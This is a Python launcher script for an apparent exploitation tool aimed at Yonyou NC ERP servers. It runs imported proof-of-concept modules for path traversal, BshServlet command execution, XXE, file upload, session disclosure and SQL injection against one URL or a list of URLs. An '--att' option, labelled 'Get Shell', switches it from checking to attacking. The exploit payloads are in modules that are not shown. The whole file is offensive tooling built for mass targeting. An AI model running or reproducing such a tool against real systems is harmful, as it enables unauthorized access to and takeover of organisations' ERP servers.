# -*- coding: utf-8 -*-

import os
from pyfiglet import Figlet
from optparse import OptionParser
from poc import traversal, BshServlet, xxe, UploadFileData, getSessionList, sqli
import urllib3


urllib3.disable_warnings()

if __name__ == '__main__':
    # os.system('@echo off')
    # os.system('chcp 936 >nul')
    f = Figlet(font='doom')
    print('\033[31m====================================================\033[0m')
    print('\033[34m{}\033[0m'.format(f.renderText('YonyouNC')))
    print('   \033[33mAuthor:Qianlingshan    ver:1.0    time:2022-01-21\033[0m')
    print('\033[31m====================================================\033[0m' + '\n')
    usage = "\n" + "python3 %prog -u url" + "\n" + "python3 %prog -u url --att" + "\n" + "python3 %prog -f url.txt" + "\n" + "python3 %prog -f url.txt --att "
    parser = OptionParser(usage=usage)
    parser.add_option('-u', '--url', dest='url', help="target url")
    parser.add_option('-f', '--file', dest='file', help="url file")
    parser.add_option('--att', dest='attack', default=False, action='store_true', help="Get Shell")
    (options, args) = parser.parse_args()
    if options.file:
        f = open(options.file, 'r')
        urls = f.readlines()
        for url in urls:
            url = url.strip('\n')
            traversal.check_erp(url)
            traversal.check_templateOfTaohong_manager_dt(url)
            BshServlet.BshServlet(url, options.attack)
            xxe.check_Proxy_SQL(url)
            UploadFileData.UploadFileData(url, options.attack)
            getSessionList.check_getSessionList(url)
            sqli.check_sqli(url)
        print('\033[34m[#]扫描已完成，结果保存至result.txt\033[0m')

    if options.url:
        traversal.check_erp(options.url)
        BshServlet.BshServlet(options.url, options.attack)
        print('\033[34m[#]扫描已完成，结果保存至result.txt\033[0m')


